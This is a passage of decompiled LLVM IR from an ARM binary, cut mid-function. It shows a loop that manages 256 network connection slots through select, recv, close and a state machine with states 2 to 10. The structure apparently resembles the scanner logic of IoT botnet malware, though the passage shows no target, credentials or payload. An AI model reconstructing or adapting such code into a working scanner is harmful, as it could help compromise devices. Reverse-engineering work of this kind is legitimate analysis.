  br i1 %v7_10428, label %dec_label_pc_10434, label %dec_label_pc_10418.dec_label_pc_10418_crit_edge

dec_label_pc_10434:                               ; preds = %dec_label_pc_10418.dec_label_pc_10418_crit_edge, %dec_label_pc_10410
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10434 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10434, i32* @r6, align 4
  store i32 %v0_10434, i32* @r5, align 4
  store i32 %v0_10434, i32* %stack_var_-52, align 4
  br label %dec_label_pc_10490

dec_label_pc_10444:                               ; preds = %dec_label_pc_104c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_104ac, i1* %cpsr_z.global-to-local, align 1
  %v1_10530 = add i32 %v2_104a4, 4
  %v2_10530 = inttoptr i32 %v1_10530 to i32*
  %v3_10530 = load i32, i32* %v2_10530, align 4
  br i1 %v7_104ac, label %dec_label_pc_10530, label %dec_label_pc_1044c

dec_label_pc_1044c:                               ; preds = %dec_label_pc_10444
  store i32 %v3_10530, i32* %ip.global-to-local, align 4
  %v3_10450 = udiv i32 %v3_10530, 32
  store i32 %v2_10538, i32* %r2.global-to-local, align 4
  %v3_10458 = mul nuw nsw i32 %v3_10450, 4
  %v2_1045c = add i32 %v3_10458, %v2_10538
  store i32 %v2_1045c, i32* %r3.global-to-local, align 4
  %v1_10460 = add i32 %v2_1045c, -184
  %v2_10460 = inttoptr i32 %v1_10460 to i32*
  %v3_10460 = load i32, i32* %v2_10460, align 4
  %v1_10464 = urem i32 %v3_10530, 32
  store i32 %v1_10464, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_1046c = shl i32 1, %v1_10464
  %v8_1046c = or i32 %v3_10460, %v7_1046c
  store i32 %v8_1046c, i32* %r2.global-to-local, align 4
  store i32 %v8_1046c, i32* %v2_10460, align 4
  %v0_10474 = load i32, i32* @r6, align 4
  %v1_10474 = load i32, i32* %ip.global-to-local, align 4
  %v3_10474 = icmp uge i32 %v0_10474, %v1_10474
  store i1 %v3_10474, i1* %cpsr_c.global-to-local, align 1
  %v9_10474 = icmp eq i32 %v0_10474, %v1_10474
  store i1 %v9_10474, i1* %cpsr_z.global-to-local, align 1
  %v5_10478 = icmp slt i32 %v0_10474, %v1_10474
  br i1 %v5_10478, label %bb1921, label %bb1922

bb1921:                                           ; preds = %dec_label_pc_1044c
  store i32 %v1_10474, i32* @r6, align 4
  br label %bb1922

bb1922:                                           ; preds = %.thread668, %bb1928, %bb1926, %bb1930, %dec_label_pc_10524, %dec_label_pc_1044c, %bb1921
  %v3_1047c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1047c, i32* %r3.global-to-local, align 4
  %v1_10480 = add i32 %v3_1047c, 1
  store i32 %v1_10480, i32* %r2.global-to-local, align 4
  %v2_10484 = icmp ugt i32 %v1_10480, 254
  store i1 %v2_10484, i1* %cpsr_c.global-to-local, align 1
  %v7_10484 = icmp eq i32 %v1_10480, 255
  store i1 %v7_10484, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10480, i32* %stack_var_-52, align 4
  %v8_1048c = icmp sgt i32 %v1_10480, 255
  br i1 %v8_1048c, label %dec_label_pc_10560, label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %bb1922, %dec_label_pc_10434
  %v0_1049c = phi i32 [ %v1_10480, %bb1922 ], [ %v0_10434, %dec_label_pc_10434 ]
  store i32 ptrtoint (i32* @global_var_25d64.147 to i32), i32* @lr, align 4
  %v3_10494 = mul i32 %v0_1049c, 256
  store i32 %v3_10494, i32* %r3.global-to-local, align 4
  %v2_10498 = load i32, i32* @global_var_25d64.147, align 4
  store i32 %v2_10498, i32* @r1, align 4
  %v2_104a0 = mul i32 %v0_1049c, 288
  store i32 %v2_104a0, i32* %r2.global-to-local, align 4
  %v2_104a4 = add i32 %v2_10498, %v2_104a0
  store i32 %v2_104a4, i32* @r4, align 4
  %v1_104a8 = add i32 %v2_104a4, 12
  %v2_104a8 = inttoptr i32 %v1_104a8 to i32*
  %v3_104a8 = load i32, i32* %v2_104a8, align 4
  store i32 %v3_104a8, i32* %ip.global-to-local, align 4
  %v2_104ac = icmp ne i32 %v3_104a8, 0
  store i1 %v2_104ac, i1* %cpsr_c.global-to-local, align 1
  %v7_104ac = icmp eq i32 %v3_104a8, 1
  store i1 %v7_104ac, i1* %cpsr_z.global-to-local, align 1
  %v2_104b0 = xor i1 %v2_104ac, true
  %v3_104b0 = or i1 %v7_104ac, %v2_104b0
  br i1 %v3_104b0, label %bb1923, label %bb1924

bb1923:                                           ; preds = %dec_label_pc_10490
  store i32 5, i32* @r1, align 4
  br label %bb1924

bb1924:                                           ; preds = %dec_label_pc_10490, %bb1923
  %v1_104d01080 = phi i32 [ %v2_10498, %dec_label_pc_10490 ], [ 5, %bb1923 ]
  %v2_104b4 = xor i1 %v7_104ac, true
  %v3_104b4 = and i1 %v2_104ac, %v2_104b4
  br i1 %v3_104b4, label %bb1925, label %bb1926

bb1925:                                           ; preds = %bb1924
  store i32 30, i32* @r1, align 4
  br label %bb1926

bb1926:                                           ; preds = %bb1924, %bb1925
  %v1_104d0 = phi i32 [ %v1_104d01080, %bb1924 ], [ 30, %bb1925 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104b8 = icmp eq i32 %v3_104a8, 0
  store i1 %v2_104b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_104b8, label %bb1922, label %dec_label_pc_104c0

dec_label_pc_104c0:                               ; preds = %bb1926
  store i32 ptrtoint (i32* @global_var_23280.135 to i32), i32* %r0.global-to-local, align 4
  %v1_104c4 = add i32 %v2_104a4, 8
  %v2_104c4 = inttoptr i32 %v1_104c4 to i32*
  %v3_104c4 = load i32, i32* %v2_104c4, align 4
  store i32 %v3_104c4, i32* %r2.global-to-local, align 4
  %v2_104c8 = load i32, i32* @global_var_23280.135, align 4
  %v2_104cc = sub i32 %v2_104c8, %v3_104c4
  store i32 %v2_104cc, i32* %r3.global-to-local, align 4
  %v3_104d0 = icmp uge i32 %v2_104cc, %v1_104d0
  store i1 %v3_104d0, i1* %cpsr_c.global-to-local, align 1
  %v9_104d0 = icmp eq i32 %v2_104cc, %v1_104d0
  store i1 %v9_104d0, i1* %cpsr_z.global-to-local, align 1
  %v2_104d4 = xor i1 %v3_104d0, true
  %v3_104d4 = or i1 %v9_104d0, %v2_104d4
  br i1 %v3_104d4, label %dec_label_pc_10444, label %dec_label_pc_104d8

dec_label_pc_104d8:                               ; preds = %dec_label_pc_104c0
  %v1_104d8 = add i32 %v2_104a4, 4
  %v2_104d8 = inttoptr i32 %v1_104d8 to i32*
  %v3_104d8 = load i32, i32* %v2_104d8, align 4
  store i32 %v3_104d8, i32* %r0.global-to-local, align 4
  %v1_104dc = call i32 @__GI___libc_close(i32 %v3_104d8)
  store i32 %v1_104dc, i32* %r0.global-to-local, align 4
  %v0_104e0 = load i32, i32* @r4, align 4
  %v1_104e0 = add i32 %v0_104e0, 12
  %v2_104e0 = inttoptr i32 %v1_104e0 to i32*
  %v3_104e0 = load i32, i32* %v2_104e0, align 4
  store i32 %v3_104e0, i32* %r3.global-to-local, align 4
  %v2_104e4 = icmp ugt i32 %v3_104e0, 1
  store i1 %v2_104e4, i1* %cpsr_c.global-to-local, align 1
  %v7_104e4 = icmp eq i32 %v3_104e0, 2
  store i1 %v7_104e4, i1* %cpsr_z.global-to-local, align 1
  %v2_104e8 = xor i1 %v2_104e4, true
  %v3_104e8 = or i1 %v7_104e4, %v2_104e8
  br i1 %v3_104e8, label %bb1927, label %.thread1181

.thread1181:                                      ; preds = %dec_label_pc_104d8
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_104f011781182 = add i32 %v0_104e0, 4
  %v3_104f011791183 = inttoptr i32 %v2_104f011781182 to i32*
  store i32 -1, i32* %v3_104f011791183, align 4
  br label %bb1928

bb1927:                                           ; preds = %dec_label_pc_104d8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_104f01175 = add i32 %v0_104e0, 4
  %v3_104f01176 = inttoptr i32 %v2_104f01175 to i32*
  store i32 -1, i32* %v3_104f01176, align 4
  %v4_104f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_104f4 = load i32, i32* @r4, align 4
  %v6_104f4 = add i32 %v5_104f4, 12
  %v7_104f4 = inttoptr i32 %v6_104f4 to i32*
  store i32 %v4_104f4, i32* %v7_104f4, align 4
  %v4_104f8 = load i32, i32* %r3.global-to-local, align 4
  %v5_104f8 = trunc i32 %v4_104f8 to i8
  %v6_104f8 = load i32, i32* @r4, align 4
  %v7_104f8 = add i32 %v6_104f8, 284
  %v8_104f8 = inttoptr i32 %v7_104f8 to i8*
  store i8 %v5_104f8, i8* %v8_104f8, align 1
  %v0_104fc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_104fc.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb1928

bb1928:                                           ; preds = %.thread1181, %bb1927
  %v1_104fc = phi i1 [ %v1_104fc.pre, %bb1927 ], [ %v2_104e4, %.thread1181 ]
  %v0_104fc = phi i1 [ %v0_104fc.pre, %bb1927 ], [ false, %.thread1181 ]
  %v2_104fc = xor i1 %v1_104fc, true
  %v3_104fc = or i1 %v0_104fc, %v2_104fc
  br i1 %v3_104fc, label %bb1922, label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %bb1928
  %v0_10500 = load i32, i32* @r4, align 4
  %v1_10500 = add i32 %v0_10500, 284
  %v2_10500 = inttoptr i32 %v1_10500 to i8*
  %v3_10500 = load i8, i8* %v2_10500, align 1
  %v4_10500 = zext i8 %v3_10500 to i32
  %v1_10504 = add nuw nsw i32 %v4_10500, 1
  %v1_10508 = urem i32 %v1_10504, 256
  store i32 %v1_10508, i32* %r3.global-to-local, align 4
  %v2_1050c = icmp ugt i32 %v1_10508, 9
  store i1 %v2_1050c, i1* %cpsr_c.global-to-local, align 1
  %v7_1050c = icmp eq i32 %v1_10508, 10
  store i1 %v7_1050c, i1* %cpsr_z.global-to-local, align 1
  %v1_10510 = trunc i32 %v1_10504 to i8
  store i8 %v1_10510, i8* %v2_10500, align 1
  %v0_10514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10514, label %.thread668, label %dec_label_pc_10524

.thread668:                                       ; preds = %dec_label_pc_10500
  %v1_10514 = load i32, i32* %r3.global-to-local, align 4
  %v2_10514 = add i32 %v1_10514, -10
  store i32 %v2_10514, i32* %r3.global-to-local, align 4
  %v2_10518 = load i32, i32* @r4, align 4
  %v3_10518 = add i32 %v2_10518, 12
  %v4_10518 = inttoptr i32 %v3_10518 to i32*
  store i32 %v2_10514, i32* %v4_10518, align 4
  %v1_1051c = load i32, i32* %r3.global-to-local, align 4
  %v2_1051c = trunc i32 %v1_1051c to i8
  %v3_1051c = load i32, i32* @r4, align 4
  %v4_1051c = add i32 %v3_1051c, 284
  %v5_1051c = inttoptr i32 %v4_1051c to i8*
  store i8 %v2_1051c, i8* %v5_1051c, align 1
  %v0_10520.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10520.pr.pr, label %bb1922, label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %dec_label_pc_10500, %.thread668
  %v0_10524 = load i32, i32* @r4, align 4
  store i32 %v0_10524, i32* @r0, align 4
  %v0_10528 = call i32 @setup_connection()
  store i32 %v0_10528, i32* %r0.global-to-local, align 4
  br label %bb1922

dec_label_pc_10530:                               ; preds = %dec_label_pc_10444
  store i32 %v3_10530, i32* %r0.global-to-local, align 4
  %v3_10534 = udiv i32 %v3_10530, 32
  store i32 %v2_10538, i32* %r1.global-to-local, align 4
  %v3_1053c = mul nuw nsw i32 %v3_10534, 4
  %v2_10540 = add i32 %v3_1053c, %v2_10538
  store i32 %v2_10540, i32* %r3.global-to-local, align 4
  %v1_10544 = add i32 %v2_10540, -312
  %v2_10544 = inttoptr i32 %v1_10544 to i32*
  %v3_10544 = load i32, i32* %v2_10544, align 4
  %v1_10548 = urem i32 %v3_10530, 32
  store i32 %v1_10548, i32* %r1.global-to-local, align 4
  %v7_1054c = shl i32 1, %v1_10548
  %v8_1054c = or i32 %v3_10544, %v7_1054c
  store i32 %v8_1054c, i32* %r2.global-to-local, align 4
  %v0_10550 = load i32, i32* @r5, align 4
  %v3_10550 = icmp uge i32 %v0_10550, %v3_10530
  store i1 %v3_10550, i1* %cpsr_c.global-to-local, align 1
  %v9_10550 = icmp eq i32 %v0_10550, %v3_10530
  store i1 %v9_10550, i1* %cpsr_z.global-to-local, align 1
  %v5_10554 = icmp slt i32 %v0_10550, %v3_10530
  br i1 %v5_10554, label %bb1929, label %bb1930

bb1929:                                           ; preds = %dec_label_pc_10530
  store i32 %v3_10530, i32* @r5, align 4
  br label %bb1930

bb1930:                                           ; preds = %dec_label_pc_10530, %bb1929
  store i32 %v8_1054c, i32* %v2_10544, align 4
  br label %bb1922

dec_label_pc_10560:                               ; preds = %bb1922
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_1056c = load i32, i32* @r5, align 4
  %v1_1056c = load i32, i32* @r6, align 4
  %v3_1056c = icmp uge i32 %v0_1056c, %v1_1056c
  store i1 %v3_1056c, i1* %cpsr_c.global-to-local, align 1
  %v9_1056c = icmp eq i32 %v0_1056c, %v1_1056c
  store i1 %v9_1056c, i1* %cpsr_z.global-to-local, align 1
  %v5_10570 = icmp slt i32 %v0_1056c, %v1_1056c
  %storemerge754 = select i1 %v5_10570, i32 %v1_1056c, i32 %v0_1056c
  store i32 %v2_10584, i32* %ip.global-to-local, align 4
  store i32 %v2_10588, i32* %r1.global-to-local, align 4
  store i32 %v2_1058c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10594 = add i32 %storemerge754, 1
  store i32 %v1_10594, i32* %r0.global-to-local, align 4
  %v5_105a0 = call i32 @__libc_select(i32 %v1_10594, i32 %v2_10588, i32 %v2_1058c, i32 0, i32 %v2_10584)
  %v0_105a4 = load i32, i32* @r4, align 4
  store i32 %v0_105a4, i32* %r0.global-to-local, align 4
  %v1_105a8 = inttoptr i32 %v0_105a4 to i32*
  %v2_105a8 = call i32 @__GI_time(i32* %v1_105a8)
  store i32 %v2_105a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23280.135 to i32), i32* @lr, align 4
  %v0_105b0 = load i32, i32* @r4, align 4
  store i32 %v0_105b0, i32* %stack_var_-52, align 4
  store i32 %v2_105a8, i32* @global_var_23280.135, align 4
  br label %dec_label_pc_105b8

dec_label_pc_105b8:                               ; preds = %dec_label_pc_10720, %dec_label_pc_10560
  %v0_105c4 = phi i32 [ %v1_10724, %dec_label_pc_10720 ], [ %v0_105b0, %dec_label_pc_10560 ]
  store i32 ptrtoint (i32* @global_var_25d64.147 to i32), i32* %r0.global-to-local, align 4
  %v3_105bc = mul i32 %v0_105c4, 256
  store i32 %v3_105bc, i32* %r3.global-to-local, align 4
  %v2_105c0 = load i32, i32* @global_var_25d64.147, align 4
  store i32 %v2_105c0, i32* %r1.global-to-local, align 4
  %v2_105c8 = mul i32 %v0_105c4, 288
  store i32 %v2_105c8, i32* %r2.global-to-local, align 4
  %v2_105cc = add i32 %v2_105c0, %v2_105c8
  store i32 %v2_105cc, i32* @r6, align 4
  %v1_105d0 = add i32 %v2_105cc, 4
  %v2_105d0 = inttoptr i32 %v1_105d0 to i32*
  %v3_105d0 = load i32, i32* %v2_105d0, align 4
  store i32 %v3_105d0, i32* %r0.global-to-local, align 4
  %v2_105d4 = icmp eq i32 %v3_105d0, -1
  store i1 %v2_105d4, i1* %cpsr_c.global-to-local, align 1
  %v7_105d4 = icmp eq i32 %v3_105d0, -1
  store i1 %v7_105d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105d4, label %dec_label_pc_10720, label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105b8
  %v3_105dc = udiv i32 %v3_105d0, 32
  store i32 %v2_10538, i32* %r1.global-to-local, align 4
  %v3_105e4 = mul nuw nsw i32 %v3_105dc, 4
  store i32 %v3_105e4, i32* @ip, align 4
  %v2_105e8 = add i32 %v3_105e4, %v2_10538
  store i32 %v2_105e8, i32* %r2.global-to-local, align 4
  %v1_105ec = add i32 %v2_105e8, -312
  %v2_105ec = inttoptr i32 %v1_105ec to i32*
  %v3_105ec = load i32, i32* %v2_105ec, align 4
  %v1_105f0 = urem i32 %v3_105d0, 32
  store i32 %v1_105f0, i32* %r1.global-to-local, align 4
  %v2_105f4 = add nsw i32 %v1_105f0, -1
  %v3_105f4 = shl i32 1, %v2_105f4
  %v4_105f4 = and i32 %v3_105ec, %v3_105f4
  %v5_105f4 = icmp ne i32 %v4_105f4, 0
  store i1 %v5_105f4, i1* %cpsr_c.global-to-local, align 1
  %v6_105f4 = ashr i32 %v3_105ec, %v1_105f0
  store i32 %v6_105f4, i32* %r3.global-to-local, align 4
  %v1_105f8 = urem i32 %v6_105f4, 2
  %v2_105f8 = icmp eq i32 %v1_105f8, 0
  store i1 %v2_105f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_105f8, label %dec_label_pc_10600, label %dec_label_pc_11004

dec_label_pc_10600:                               ; preds = %dec_label_pc_105dc, %dec_label_pc_110a8
  %v1_1060c = phi i32 [ %v1_105f0, %dec_label_pc_105dc ], [ %v1_1060c.pre, %dec_label_pc_110a8 ]
  %v0_10604 = phi i32 [ %v3_105e4, %dec_label_pc_105dc ], [ %v0_10604.pre, %dec_label_pc_110a8 ]
  store i32 %v2_10538, i32* %r3.global-to-local, align 4
  %v2_10604 = add i32 %v0_10604, %v2_10538
  store i32 %v2_10604, i32* %r2.global-to-local, align 4
  %v1_10608 = add i32 %v2_10604, -184
  %v2_10608 = inttoptr i32 %v1_10608 to i32*
  %v3_10608 = load i32, i32* %v2_10608, align 4
  %v2_1060c = add i32 %v1_1060c, -1
  %v3_1060c = shl i32 1, %v2_1060c
  %v4_1060c = and i32 %v3_10608, %v3_1060c
  %v5_1060c = icmp ne i32 %v4_1060c, 0
  store i1 %v5_1060c, i1* %cpsr_c.global-to-local, align 1
  %v6_1060c = ashr i32 %v3_10608, %v1_1060c
  store i32 %v6_1060c, i32* %r3.global-to-local, align 4
  %v1_10610 = urem i32 %v6_1060c, 2
  %v2_10610 = icmp eq i32 %v1_10610, 0
  store i1 %v2_10610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10610, label %dec_label_pc_10720, label %dec_label_pc_10618.preheader

dec_label_pc_10618.preheader:                     ; preds = %dec_label_pc_10600
  %v0_10618776 = load i32, i32* @r6, align 4
  %v1_10618777 = add i32 %v0_10618776, 12
  %v2_10618778 = inttoptr i32 %v1_10618777 to i32*
  %v3_10618779 = load i32, i32* %v2_10618778, align 4
  store i32 %v3_10618779, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1061c775781 = icmp eq i32 %v3_10618779, 0
  store i1 %v2_1061c775781, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1061c775781, label %dec_label_pc_10720, label %dec_label_pc_10624.lr.ph

dec_label_pc_10618.loopexit:                      ; preds = %dec_label_pc_110fc, %.thread1199
  %v0_10618 = load i32, i32* @r6, align 4
  %v1_10618 = add i32 %v0_10618, 12
  %v2_10618 = inttoptr i32 %v1_10618 to i32*
  %v3_10618 = load i32, i32* %v2_10618, align 4
  store i32 %v3_10618, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1061c775 = icmp eq i32 %v3_10618, 0
  store i1 %v2_1061c775, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1061c775, label %dec_label_pc_10720, label %dec_label_pc_10624.lr.ph

dec_label_pc_10624.lr.ph:                         ; preds = %dec_label_pc_10618.preheader, %dec_label_pc_10618.loopexit
  %v0_106241096 = phi i32 [ %v0_10618, %dec_label_pc_10618.loopexit ], [ %v0_10618776, %dec_label_pc_10618.preheader ]
  br label %dec_label_pc_10624

dec_label_pc_10624:                               ; preds = %dec_label_pc_1061c.backedge.thread, %dec_label_pc_1061c.backedge, %dec_label_pc_1061c.backedge.thread2185, %dec_label_pc_10624.lr.ph
  %v0_10fe0 = phi i32 [ %v0_106241096, %dec_label_pc_10624.lr.ph ], [ %v0_106241093, %dec_label_pc_1061c.backedge ], [ %v0_10698, %dec_label_pc_1061c.backedge.thread ], [ %v0_10698, %dec_label_pc_1061c.backedge.thread2185 ]
  %v1_10624 = add i32 %v0_10fe0, 24
  %v2_10624 = inttoptr i32 %v1_10624 to i32*
  %v3_10624 = load i32, i32* %v2_10624, align 4
  store i32 %v3_10624, i32* @r3, align 4
  %v2_10628 = icmp ugt i32 %v3_10624, 255
  store i1 %v2_10628, i1* %cpsr_c.global-to-local, align 1
  %v7_10628 = icmp eq i32 %v3_10624, 256
  store i1 %v7_10628, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10fe0, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_10628, label %dec_label_pc_10fe0, label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_10624, %dec_label_pc_10fe0
  store i32 0, i32* @r5, align 4
  %v1_10638 = load i32, i32* @sb, align 4
  %v2_10638 = inttoptr i32 %v1_10638 to i32*
  store i32 0, i32* %v2_10638, align 4
  %v0_1063c = load i32, i32* @r6, align 4
  %v1_1063c = add i32 %v0_1063c, 24
  %v2_1063c = inttoptr i32 %v1_1063c to i32*
  %v3_1063c = load i32, i32* %v2_1063c, align 4
  store i32 %v3_1063c, i32* %r2.global-to-local, align 4
  %v0_10640 = load i32, i32* @sl, align 4
  %v2_10640 = add i32 %v0_10640, %v3_1063c
  store i32 %v2_10640, i32* @r4, align 4
  %v1_10644 = add i32 %v0_1063c, 4
  %v2_10644 = inttoptr i32 %v1_10644 to i32*
  %v3_10644 = load i32, i32* %v2_10644, align 4
  store i32 %v3_10644, i32* %r0.global-to-local, align 4
  %v1_10648 = sub i32 256, %v3_1063c
  store i32 %v1_10648, i32* %r2.global-to-local, align 4
  store i32 %v2_10640, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10654 = call i32 @__libc_recv(i32 %v3_10644, i32 %v2_10640, i32 %v1_10648, i32 16384)
  store i32 %v4_10654, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10658 = icmp eq i32 %v4_10654, 0
  store i1 %v2_10658, i1* %cpsr_z.global-to-local, align 1
  %tmp1931 = icmp slt i32 %v4_10654, 1
  br i1 %tmp1931, label %dec_label_pc_106d0, label %dec_label_pc_10660

dec_label_pc_10660:                               ; preds = %dec_label_pc_10634
  %v0_10660 = load i32, i32* @r5, align 4
  store i32 %v0_10660, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %.thread675, %dec_label_pc_10660
  %v3_10670 = phi i32 [ %v1_10674, %.thread675 ], [ %v0_10660, %dec_label_pc_10660 ]
  %v1_10664 = load i32, i32* @r4, align 4
  %v2_10664 = add i32 %v1_10664, %v3_10670
  %v3_10664 = inttoptr i32 %v2_10664 to i8*
  %v4_10664 = load i8, i8* %v3_10664, align 1
  %v6_10664 = zext i8 %v4_10664 to i32
  store i32 %v6_10664, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10668 = icmp eq i8 %v4_10664, 0
  store i1 %v2_10668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10668, label %bb1932, label %.thread675

bb1932:                                           ; preds = %dec_label_pc_10664
  %v2_1066c = add nuw nsw i32 %v6_10664, 65
  store i32 %v2_1066c, i32* %r3.global-to-local, align 4
  %v2_10670 = trunc i32 %v2_1066c to i8
  store i8 %v2_10670, i8* %v3_10664, align 1
  %v0_10674.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread675

.thread675:                                       ; preds = %dec_label_pc_10664, %bb1932
  %v0_10674 = phi i32 [ %v3_10670, %dec_label_pc_10664 ], [ %v0_10674.pre, %bb1932 ]
  %v1_10674 = add i32 %v0_10674, 1
  store i32 %v1_10674, i32* %r2.global-to-local, align 4
  %v3_10678 = icmp uge i32 %v1_10674, %v4_10654
  store i1 %v3_10678, i1* %cpsr_c.global-to-local, align 1
  %v9_10678 = icmp eq i32 %v1_10674, %v4_10654
  store i1 %v9_10678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10678, label %dec_label_pc_10680, label %dec_label_pc_10664

dec_label_pc_10680:                               ; preds = %.thread675, %dec_label_pc_106d4
  store i32 ptrtoint (i32* @global_var_23280.135 to i32), i32* @r4, align 4
  %v0_10684 = load i32, i32* @r6, align 4
  %v1_10684 = add i32 %v0_10684, 24
  %v2_10684 = inttoptr i32 %v1_10684 to i32*
  %v3_10684 = load i32, i32* %v2_10684, align 4
  %v2_10688 = load i32, i32* @global_var_23280.135, align 4
  store i32 %v2_10688, i32* %r2.global-to-local, align 4
  %v2_1068c = add i32 %v3_10684, %v4_10654
  store i32 %v2_1068c, i32* %r3.global-to-local, align 4
  store i32 %v2_1068c, i32* %v2_10684, align 4
  %v0_10694 = load i32, i32* %r2.global-to-local, align 4
  %v1_10694 = load i32, i32* @r6, align 4
  %v2_10694 = add i32 %v1_10694, 8
  %v3_10694 = inttoptr i32 %v2_10694 to i32*
  store i32 %v0_10694, i32* %v3_10694, align 4
  br label %dec_label_pc_10698

dec_label_pc_10698:                               ; preds = %dec_label_pc_107b0, %dec_label_pc_10680
  %v0_10698 = load i32, i32* @r6, align 4
  %v1_10698 = add i32 %v0_10698, 12
  %v2_10698 = inttoptr i32 %v1_10698 to i32*
  %v3_10698 = load i32, i32* %v2_10698, align 4
  store i32 %v3_10698, i32* %r0.global-to-local, align 4
  %v1_1069c = add i32 %v3_10698, -2
  store i32 %v1_1069c, i32* @r3, align 4
  %v7_106a0 = icmp eq i32 %v1_1069c, 8
  store i1 %v7_106a0, i1* %cpsr_z.global-to-local, align 1
  %v5_106a4 = and i32 %v1_1069c, 1073741824
  %v6_106a4 = icmp ne i32 %v5_106a4, 0
  store i1 %v6_106a4, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10698, label %dec_label_pc_1061c.backedge [
    i32 2, label %dec_label_pc_10b28
    i32 3, label %dec_label_pc_10cec
    i32 4, label %dec_label_pc_10c00
    i32 5, label %dec_label_pc_10e0c
    i32 6, label %dec_label_pc_10a54
    i32 7, label %dec_label_pc_10980
    i32 8, label %dec_label_pc_108ac
    i32 9, label %dec_label_pc_107d8
    i32 10, label %dec_label_pc_10738
  ]

dec_label_pc_106d0:                               ; preds = %dec_label_pc_10634
  br i1 %v2_10658, label %dec_label_pc_112f4, label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_106d0
  %v3_106d4 = icmp eq i32 %v4_10654, -1
  store i1 %v3_106d4, i1* %cpsr_c.global-to-local, align 1
  %v8_106d4 = icmp eq i32 %v4_10654, -1
  store i1 %v8_106d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_106d4, label %dec_label_pc_106dc, label %dec_label_pc_10680

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106d4
  %v0_106dc = load i32, i32* @sb, align 4
  %v1_106dc = inttoptr i32 %v0_106dc to i32*
  %v2_106dc = load i32, i32* %v1_106dc, align 4
  store i32 %v2_106dc, i32* %r3.global-to-local, align 4
  %v2_106e0 = icmp ugt i32 %v2_106dc, 10
  store i1 %v2_106e0, i1* %cpsr_c.global-to-local, align 1
  %v7_106e0 = icmp eq i32 %v2_106dc, 11
  store i1 %v7_106e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106e0, label %dec_label_pc_10720, label %dec_label_pc_106e8

dec_label_pc_106e8:                               ; preds = %dec_label_pc_106dc, %dec_label_pc_112f4
  %v0_106e8 = load i32, i32* @r6, align 4
  %v1_106e8 = add i32 %v0_106e8, 4
  %v2_106e8 = inttoptr i32 %v1_106e8 to i32*
  %v3_106e8 = load i32, i32* %v2_106e8, align 4
  store i32 %v3_106e8, i32* %r0.global-to-local, align 4
  %v1_106ec = call i32 @__GI___libc_close(i32 %v3_106e8)
  store i32 %v1_106ec, i32* %r0.global-to-local, align 4
  %v0_106f0 = load i32, i32* @r6, align 4
  %v1_106f0 = add i32 %v0_106f0, 284
  %v2_106f0 = inttoptr i32 %v1_106f0 to i8*
  %v3_106f0 = load i8, i8* %v2_106f0, align 1
  %v4_106f0 = zext i8 %v3_106f0 to i32
  %v1_106f4 = add nuw nsw i32 %v4_106f0, 1
  %v1_106f8 = urem i32 %v1_106f4, 256
  store i32 %v1_106f8, i32* %r3.global-to-local, align 4
  %v2_106fc = icmp ugt i32 %v1_106f8, 8
  store i1 %v2_106fc, i1* %cpsr_c.global-to-local, align 1
  %v7_106fc = icmp eq i32 %v1_106f8, 9
  store i1 %v7_106fc, i1* %cpsr_z.global-to-local, align 1
  %v1_10700 = trunc i32 %v1_106f4 to i8
  store i8 %v1_10700, i8* %v2_106f0, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_10708 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10708 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10708 = xor i1 %v1_10708, true
  %v3_10708 = and i1 %v0_10708, %v2_10708
  br i1 %v3_10708, label %bb1933, label %.thread1193

.thread1193:                                      ; preds = %dec_label_pc_106e8
